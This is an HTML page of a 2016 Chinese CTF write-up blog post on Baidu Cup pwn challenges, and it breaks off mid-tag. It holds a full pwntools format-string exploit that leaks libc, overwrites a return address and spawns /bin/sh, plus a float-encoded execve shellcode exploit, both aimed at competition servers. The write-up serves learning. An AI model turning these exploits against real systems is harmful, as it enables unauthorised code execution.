@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<title>Baiudu杯 pwn专场记录 | o0xmuhe's blog</title>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
+<meta content="前言十一月的第一周，百度杯的pwn专场，就去学习了下姿势，更加认识到自己的不足和问题所在，以后努力更正改进~本次比赛一共是3个misc和三个pwn，题目都不难，pwn好像有两个都是原题，但是我只google到了第二个题目…" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="Baiudu杯 pwn专场记录" property="og:title"/>
+<meta content="http://o0xmuhe.me/2016/11/07/Baiudu杯-pwn专场记录/index.html" property="og:url"/>
+<meta content="o0xmuhe's blog" property="og:site_name"/>
+<meta content="前言十一月的第一周，百度杯的pwn专场，就去学习了下姿势，更加认识到自己的不足和问题所在，以后努力更正改进~本次比赛一共是3个misc和三个pwn，题目都不难，pwn好像有两个都是原题，但是我只google到了第二个题目…" property="og:description"/>
+<meta content="http://blogimg-10065924.cos.myqcloud.com/baidu-pwn/vuln.png" property="og:image"/>
+<meta content="2016-11-07T09:43:07.485Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="Baiudu杯 pwn专场记录" name="twitter:title"/>
+<meta content="前言十一月的第一周，百度杯的pwn专场，就去学习了下姿势，更加认识到自己的不足和问题所在，以后努力更正改进~本次比赛一共是3个misc和三个pwn，题目都不难，pwn好像有两个都是原题，但是我只google到了第二个题目…" name="twitter:description"/>
+<meta content="http://blogimg-10065924.cos.myqcloud.com/baidu-pwn/vuln.png" name="twitter:image"/>
+<link href="./Baiudu杯 pwn专场记录  o0xmuhe's blog/atom.xml" rel="alternative" title="o0xmuhe's blog" type="application/atom+xml"/>
+<link href="./Baiudu杯 pwn专场记录  o0xmuhe's blog/favicon.png" rel="icon"/>
+<link href="./Baiudu杯 pwn专场记录  o0xmuhe's blog/animate.min.css" rel="stylesheet"/>
+<link href="./Baiudu杯 pwn专场记录  o0xmuhe's blog/style.css" rel="stylesheet"/>
+<link href="./Baiudu杯 pwn专场记录  o0xmuhe's blog/font-awesome.min.css" rel="stylesheet"/>
+<link href="./Baiudu杯 pwn专场记录  o0xmuhe's blog/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./Baiudu杯 pwn专场记录  o0xmuhe's blog/jquery.fancybox.css" rel="stylesheet"/>
+<!-- 加载特效 -->
+<script src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/pace.js"></script>
+<link href="./Baiudu杯 pwn专场记录  o0xmuhe's blog/pace-theme-flash.css" rel="stylesheet">
+<script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</link></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/head.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="Hi Mate">muhe</a></h1>
+</hgroup>
+<p class="header-subtitle">一个有情怀的二进制狗</p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="/">博客首页</a></li>
+<li><a href="/archives">所有文章</a></li>
+<li><a href="/tags">标签</a></li>
+<li><a href="/about">关于我</a></li>
+<li><a href="/Pwnable-Log">Pwnable</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fl github" href="https://github.com/o0xmuhe" target="_blank" title="github">github</a>
+<a class="fl weibo" href="http://weibo.com/2070174943/" target="_blank" title="weibo">weibo</a>
+<a class="fl twitter" href="https://twitter.com/0xmuhe" target="_blank" title="twitter">twitter</a>
+<a class="fl rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<a href="/tags/C/" style="font-size: 10px;">C</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CTF-Writeup/" style="font-size: 10px;">CTF Writeup</a> <a href="/tags/CVE-analysis/" style="font-size: 10px;">CVE analysis</a> <a href="/tags/LLVM/" style="font-size: 10px;">LLVM</a> <a href="/tags/Linux/" style="font-size: 12px;">Linux</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/angr/" style="font-size: 12px;">angr</a> <a href="/tags/ctf/" style="font-size: 18px;">ctf</a> <a href="/tags/ctf-writeup/" style="font-size: 20px;">ctf writeup</a> <a href="/tags/env-config/" style="font-size: 10px;">env config</a> <a href="/tags/exploit/" style="font-size: 16px;">exploit</a> <a href="/tags/fuzz/" style="font-size: 14px;">fuzz</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/glibc内存管理/" style="font-size: 10px;">glibc内存管理</a> <a href="/tags/life/" style="font-size: 12px;">life</a> <a href="/tags/linux-kernel/" style="font-size: 12px;">linux kernel</a> <a href="/tags/peach/" style="font-size: 10px;">peach</a> <a href="/tags/pwn/" style="font-size: 16px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/ret-2-dl-resolve/" style="font-size: 10px;">ret 2 dl-resolve</a> <a href="/tags/wargame/" style="font-size: 12px;">wargame</a> <a href="/tags/winafl/" style="font-size: 10px;">winafl</a> <a href="/tags/windows-kernel/" style="font-size: 14px;">windows kernel</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="http://syclover.sinaapp.com/" target="_blank">Syclover Team</a>
+<a class="main-nav-link switch-friends-link" href="http://www.Ox9A82.com" target="_blank">0x9A82学弟</a>
+<a class="main-nav-link switch-friends-link" href="http://k1n9.me/" target="_blank">K1n9师傅</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy" target="_blank">L3mon</a>
+<a class="main-nav-link switch-friends-link" href="http://www.xianyusec.com" target="_blank">咸鱼</a>
+<a class="main-nav-link switch-friends-link" href="http://v1ct0r.com/" target="_blank">V1ct0r</a>
+<a class="main-nav-link switch-friends-link" href="http://godot.win" target="_blank">Godot学弟</a>
+<a class="main-nav-link switch-friends-link" href="http://hebic.me/" target="_blank">Homaebic学弟</a>
+<a class="main-nav-link switch-friends-link" href="https://iqwq.me" target="_blank">两米的sco4x0</a>
+<a class="main-nav-link switch-friends-link" href="https://zmy.im/" target="_blank">JimmyZhou</a>
+<a class="main-nav-link switch-friends-link" href="http://silic.top/" target="_blank">灭亡叔叔</a>
+<a class="main-nav-link switch-friends-link" href="https://dwx.io" target="_blank">Jason</a>
+<a class="main-nav-link switch-friends-link" href="	http://www.0aa.me/" target="_blank">Mosuan</a>
+<a class="main-nav-link switch-friends-link" href="http://whereisk0shl.top" target="_blank">k0sh1</a>
+<a class="main-nav-link switch-friends-link" href="http://winter3un.github.io" target="_blank">WinterSun</a>
+<a class="main-nav-link switch-friends-link" href="http://venenof.com" target="_blank">Venenof</a>
+<a class="main-nav-link switch-friends-link" href="http://r0p.me/" target="_blank">Icemakr</a>
+<a class="main-nav-link switch-friends-link" href="http://bestwing.me/" target="_blank">Swing</a>
+<a class="main-nav-link switch-friends-link" href="https://www.hackfun.org/" target="_blank">4ido10n</a>
+<a class="main-nav-link switch-friends-link" href="http://www.hackersb.cn/" target="_blank">王松_Striker</a>
+<a class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/7top/" target="_blank">7top</a>
+<a class="main-nav-link switch-friends-link" href="http://www.bendawang.site" target="_blank">bendawang</a>
+<a class="main-nav-link switch-friends-link" href="http://ctfrank.org" target="_blank">CTF Rank</a>
+<a class="main-nav-link switch-friends-link" href="http://askook.me/" target="_blank">A酱</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">关注二进制安全. Member of Syclover. CTFer/INTJ.</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="Me">muhe</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="js-avatar" lazy-src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/head.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="Me">muhe</a></h1>
+</hgroup>
+<p class="header-subtitle">一个有情怀的二进制狗</p>
+<nav class="header-menu">
+<ul>
+<li><a href="/">博客首页</a></li>
+<li><a href="/archives">所有文章</a></li>
+<li><a href="/tags">标签</a></li>
+<li><a href="/about">关于我</a></li>
+<li><a href="/Pwnable-Log">Pwnable</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<div class="social">
+<a class="github" href="https://github.com/o0xmuhe" target="_blank" title="github">github</a>
+<a class="weibo" href="http://weibo.com/2070174943/" target="_blank" title="weibo">weibo</a>
+<a class="twitter" href="https://twitter.com/0xmuhe" target="_blank" title="twitter">twitter</a>
+<a class="rss" href="/atom.xml" target="_blank" title="rss">rss</a>
+</div>
+</nav>
+</header>
+</div>
+</nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-Baiudu杯-pwn专场记录" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2016/11/07/Baiudu杯-pwn专场记录/">
+<time datetime="2016-11-07T09:07:19.000Z" itemprop="datePublished">2016-11-07</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      Baiudu杯 pwn专场记录
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Writeup/">CTF Writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<h4 id="前言"><a class="headerlink" href="#前言" title="前言"></a>前言</h4><p>十一月的第一周，百度杯的pwn专场，就去学习了下姿势，更加认识到自己的不足和问题所在，以后努力更正改进~<br/>本次比赛一共是3个misc和三个pwn，题目都不难，pwn好像有两个都是原题，但是我只google到了第二个题目…<br/><a id="more"></a></p>
+<h4 id="1-pwnme"><a class="headerlink" href="#1-pwnme" title="1.pwnme"></a>1.pwnme</h4><pre><code>格式化字符串(x64)
+</code></pre><p>其实后面还有个bof，fmt和bof的结合可能才是出题人的本意吧(我猜的)。<br/><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ checksec pwnme </div><div class="line">[!] Couldn't find relocations against PLT to get symbols</div><div class="line">[*] '/home/muhe/Desktop/baidu-pwn1/pwnme'</div><div class="line">    <span class="keyword">Arch</span>:     amd64-64-little</div><div class="line">    RELRO:    Full RELRO</div><div class="line">    <span class="keyword">Stack</span>:    <span class="keyword">No</span> canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      <span class="keyword">No</span> PIE</div></pre></td></tr></table></figure></p>
+<ul>
+<li>格式化字符串<br/><img alt="" src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/vuln.png"/><br/>在输出<code>name</code>和<code>pass</code>的时候会导致这个格式化字符串，可以任意地址读写。</li>
+</ul>
+<p>但是需要注意</p>
+<ul>
+<li>x64中fmt 泄露的参数的顺序(<code>RDI-RDX-RCX-R8-R9-stack[0]-stack[1]......</code>)</li>
+<li>因为有00截断，所以要格式化的地址放后面( -。- 没错 后入式)</li>
+</ul>
+<p>本来以为开了 Full RELRO 的情况下 DynELF就不行了，还想着手动去解析出libc基地址然后再搞呢…改了下方式就可以了。<br/>在师傅的指导下完成了leak的部分，然后是使用DynELF去泄露system的地址，后面改返回地址为system，然后设置好参数后，ret过去。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding:utf-8-*-</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment"># based on joker 's exploit</span></div><div class="line">r = remote(<span class="string">"106.75.84.74"</span>, <span class="number">10001</span>)<span class="comment">#pwn</span></div><div class="line"><span class="comment">#r = remote("127.0.0.1", 10001)#pwn</span></div><div class="line"><span class="comment">#context.log_level = "debug"</span></div><div class="line"></div><div class="line">read_got = <span class="number">0x0000000000601FC8</span></div><div class="line">pop_rdi_ret = <span class="number">0x0000000000400ed3</span></div><div class="line">pppr = <span class="number">0x000000000400ECE</span></div><div class="line"><span class="comment">#ret addr 0x0000000000400e56</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"2"</span>)</div><div class="line">    r.recvuntil(<span class="string">"20):"</span>)</div><div class="line">    payload = <span class="string">"aaaa"</span></div><div class="line">    r.sendline(payload)</div><div class="line">    r.recvuntil(<span class="string">"20):"</span>)</div><div class="line">    payload = <span class="string">"%12$s"</span>+<span class="string">"AAAAAAA"</span> + p64(addr)</div><div class="line">    r.send(payload)</div><div class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"1"</span>)</div><div class="line">    content = r.recvuntil(<span class="string">"AAAAAAA"</span>)</div><div class="line">    <span class="keyword">if</span>(len(content) == <span class="number">12</span>):</div><div class="line">        <span class="keyword">print</span> <span class="string">"[*] NULL "</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"[*]%#x -- &gt; %s"</span> % (addr,(content[<span class="number">5</span>:<span class="number">-7</span>] <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</div><div class="line">        <span class="keyword">return</span> content[<span class="number">5</span>:<span class="number">-7</span>]</div><div class="line"></div><div class="line"><span class="comment">#writebyte</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">writebyte</span><span class="params">(count_byte,addr)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"2"</span>)</div><div class="line">    r.recvuntil(<span class="string">"20):"</span>)</div><div class="line">    payload = <span class="string">"aaaa"</span></div><div class="line">    r.sendline(payload)</div><div class="line">    r.recvuntil(<span class="string">"20):"</span>)</div><div class="line">    payload = <span class="string">"%{0}c%12$hhn"</span>.format(count_byte)</div><div class="line">    payload += <span class="string">"A"</span>*(<span class="number">12</span>-len(payload)) + p64(addr)</div><div class="line">    r.send(payload)</div><div class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"1"</span>)</div><div class="line">    r.recvuntil(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"40):"</span>)</div><div class="line">r.sendline(<span class="string">"aaa"</span>)</div><div class="line">r.recvuntil(<span class="string">"40):"</span>)</div><div class="line">r.sendline(<span class="string">"aaa"</span>)</div><div class="line"></div><div class="line">d = DynELF(leak,elf=ELF(<span class="string">'./pwnme'</span>))</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"[*] system addr:{0}"</span>.format(hex(system_addr))</div><div class="line"></div><div class="line"><span class="comment">#leak ret_addr</span></div><div class="line">r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">r.sendline(<span class="string">"2"</span>)</div><div class="line">r.recvuntil(<span class="string">"20):"</span>)</div><div class="line">payload = <span class="string">"aaaa"</span></div><div class="line">r.sendline(payload)</div><div class="line">r.recvuntil(<span class="string">"20):"</span>)</div><div class="line">payload = <span class="string">"%6$s"</span> <span class="comment">#stack</span></div><div class="line">r.send(payload)</div><div class="line">r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">r.sendline(<span class="string">"1"</span>)</div><div class="line">r.recvuntil(<span class="string">"\n"</span>)</div><div class="line">content = r.recv(<span class="number">6</span>)</div><div class="line">content = content.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)</div><div class="line">stack_addr = u64(content)  <span class="comment"># 0x7ffc23fb85e0</span></div><div class="line">stack_while_ret_addr = stack_addr + <span class="number">8</span> - <span class="number">0xb0</span> <span class="comment">#</span></div><div class="line"><span class="keyword">print</span> <span class="string">"[*] stack_while_ret addr:{0}"</span>.format(hex(stack_while_ret_addr))</div><div class="line"><span class="comment">#leak_ret_addr</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">0000| 0x7ffc23fb84f0 --&gt; 0x7ffc23fb8530 --&gt; 0x7ffc23fb85e0 --&gt; 0x400e70 (push   r15)</div><div class="line">0008| 0x7ffc23fb84f8 --&gt; 0x400d32 (add    rsp,0x30)</div><div class="line">0016| 0x7ffc23fb8500 --&gt; 0xa61616161 ('aaaa\n')</div><div class="line">0024| 0x7ffc23fb8508 --&gt; 0x0 </div><div class="line">0032| 0x7ffc23fb8510 --&gt; 0x7324362500000000 ('')</div><div class="line">0040| 0x7ffc23fb8518 --&gt; 0x0 </div><div class="line">0048| 0x7ffc23fb8520 --&gt; 0x0 </div><div class="line">0056| 0x7ffc23fb8528 --&gt; 0x400d0b (cmp    eax,0x2)</div><div class="line">'''</div><div class="line">writebyte(<span class="number">0xce</span>,stack_while_ret_addr)</div><div class="line">writebyte(system_addr &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span>)</div><div class="line">writebyte((system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">1</span>)</div><div class="line">writebyte((system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">2</span>)</div><div class="line">writebyte((system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">3</span>)</div><div class="line">writebyte((system_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">4</span>)</div><div class="line">writebyte((system_addr &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">5</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">r.sendline(<span class="string">"2"</span>)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"20):"</span>)</div><div class="line">payload = <span class="string">"/bin/sh;"</span> + <span class="string">"AAAAAAAABBB"</span></div><div class="line">r.sendline(payload)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"20):"</span>)</div><div class="line">payload = <span class="string">"\x00\x00\x00\x00"</span> + p64(pop_rdi_ret) + p64(stack_while_ret_addr + <span class="number">8</span>)</div><div class="line"><span class="comment">#raw_input('$ret')</span></div><div class="line">r.send(payload)</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</div><div class="line">r.sendline(<span class="string">'3'</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<h4 id="2-loading"><a class="headerlink" href="#2-loading" title="2.loading"></a>2.loading</h4><pre><code>简单粗暴把输入的每个字节 /2333.0 然后直接执行
+</code></pre><p>浮点数的考察啊…google了下 <code>float shellcode</code>，就找到了原题啊…把别人exp里的1337.0改成2333.0就好了…<br/>搜到了<a href="https://j31d0.github.io/writeup/2016/04/18/pctf2016-fixedpoint/" rel="external" target="_blank">pctf 2016 fixedpoint writeup</a><br/>还有这个 <a href="https://kimiyuki.net/blog/2016/04/18/plaidctf-2016-fixedpoint/" rel="external" target="_blank">PlaidCTF 2016 fixedpoint</a></p>
+<p>pctf 这个的源码,简直不要再一样好么。<br/><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>{</div><div class="line">  <span class="keyword">float</span>* <span class="built_in">array</span> = mmap(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">float</span>)*<span class="number">8192</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  <span class="keyword">int</span> temp;</div><div class="line">  <span class="keyword">float</span> ftemp;</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8192</span>; i++) {</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;temp)) <span class="keyword">break</span>;</div><div class="line">    <span class="built_in">array</span>[i] = ((<span class="keyword">float</span>)temp)/<span class="number">1337.0</span>;</div><div class="line">  }</div><div class="line"></div><div class="line">  write(<span class="number">1</span>, <span class="string">"here we go\n"</span>, <span class="number">11</span>);</div><div class="line">  (*(<span class="keyword">void</span>(*)())<span class="built_in">array</span>)();</div><div class="line">}</div></pre></td></tr></table></figure></p>
+<p>附上exploit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> ctypes</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">shellcode = [<span class="string">"\x31\xc9"</span>, <span class="comment"># xor ecx, ecx</span></div><div class="line">             <span class="string">"\xf7\xe1"</span>, <span class="comment"># mul ecx</span></div><div class="line">             <span class="string">"\x51"</span>, <span class="comment"># push ecx</span></div><div class="line">             <span class="string">"\xb1\xff"</span>, <span class="comment"># mov cl, 0xFF</span></div><div class="line">             <span class="string">"\xb5\xff"</span>, <span class="comment"># mov ch, 0xFF</span></div><div class="line">             <span class="string">"\x41"</span>, <span class="comment"># inc ecx</span></div><div class="line">             <span class="string">"\xb4\x68"</span>, <span class="comment"># mov ah, 0x68</span></div><div class="line">             <span class="string">"\xb0\x73"</span>, <span class="comment"># mov al, 0x73</span></div><div class="line">             <span class="string">"\xf7\xe1"</span>, <span class="comment"># mul ecx</span></div><div class="line">             <span class="string">"\xb4\x2f"</span>, <span class="comment"># mov ah, 0x2F</span></div><div class="line">             <span class="string">"\xb0\x2f"</span>, <span class="comment"># mov al, 0x2F</span></div><div class="line">             <span class="string">"\x50"</span>, <span class="comment"># push eax</span></div><div class="line">             <span class="string">"\xb4\x6e"</span>, <span class="comment"># mov ah, 0x6e</span></div><div class="line">             <span class="string">"\xb0\x69"</span>, <span class="comment"># mov al, 0x69</span></div><div class="line">             <span class="string">"\xf7\xe1"</span>, <span class="comment"># mul ecx</span></div><div class="line">             <span class="string">"\xb4\x62"</span>, <span class="comment"># mov ah, 0x62</span></div><div class="line">             <span class="string">"\xb0\x2f"</span>, <span class="comment"># mov al, 0x2F</span></div><div class="line">             <span class="string">"\x50"</span>, <span class="comment"># push eax</span></div><div class="line">             <span class="string">"\x31\xc0"</span>, <span class="comment"># xor eax, eax</span></div><div class="line">             <span class="string">"\x31\xd2"</span>, <span class="comment"># xor edx, edx</span></div><div class="line">             <span class="string">"\x31\xc9"</span>, <span class="comment"># xor ecx, ecx</span></div><div class="line">             <span class="string">"\x89\xe3"</span>, <span class="comment"># mov ebx, esp</span></div><div class="line">             <span class="string">"\xb0\x0b"</span>, <span class="comment"># mov al, 11</span></div><div class="line">             <span class="string">"\xcd\x80"</span>] <span class="comment"># int 0x80</span></div><div class="line"></div><div class="line">ints_to_send = []</div><div class="line"></div><div class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> shellcode:</div><div class="line">    z = <span class="string">"\x40"</span></div><div class="line">    <span class="keyword">if</span> len(instr) == <span class="number">1</span>:</div><div class="line">        z = <span class="string">"\x90\x40"</span></div><div class="line">    payload = <span class="string">"\x48"</span> + instr[::<span class="number">-1</span>] + z</div><div class="line">    a = struct.unpack(<span class="string">"&gt;f"</span>, payload)[<span class="number">0</span>]*<span class="number">2333</span></div><div class="line">    <span class="keyword">if</span> a &gt; <span class="number">2147483647</span>:</div><div class="line">        log.error(<span class="string">"It's too large fam."</span>)</div><div class="line"></div><div class="line">    b = str(<span class="string">"{0:f}"</span>.format(a)).split(<span class="string">"."</span>)[<span class="number">0</span>]</div><div class="line"></div><div class="line">    log.info(b + <span class="string">" "</span> + payload.encode(<span class="string">"hex"</span>))</div><div class="line">    ints_to_send.append(b)</div><div class="line"></div><div class="line">r = remote(<span class="string">"106.75.84.68"</span>, <span class="number">20000</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ints_to_send:</div><div class="line">    r.sendline(i)</div><div class="line"></div><div 